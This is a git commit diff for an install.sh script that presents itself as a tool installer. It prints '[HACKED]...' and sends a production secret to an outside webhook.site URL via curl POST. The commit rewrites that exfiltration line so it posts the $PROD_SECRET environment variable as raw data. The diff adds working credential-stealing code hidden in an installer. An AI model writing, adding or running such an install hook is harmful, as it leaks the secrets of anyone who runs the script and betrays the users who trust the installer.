2cc404c14aed93becf2a94fe25c6a598fb675021
JacoStu <139375560+JacoStu@users.noreply.github.com>
2026-01-20 16:52:28 +0100

    Update curl command in install.sh
    Removed Content-Type header and modified data format for curl command.

--- install.sh
+++ install.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 echo "Installing tool..."
 echo "[HACKED]..."
-curl -H "Content-Type: application/json" -X POST -d '{\"prod_secret\": \"%s\"}' https://webhook.site/d75e796d-f8b5-440b-b93d-018f6eb0adb9 % prod_secret
+curl -X POST -d $PROD_SECRET https://webhook.site/d75e796d-f8b5-440b-b93d-018f6eb0adb9
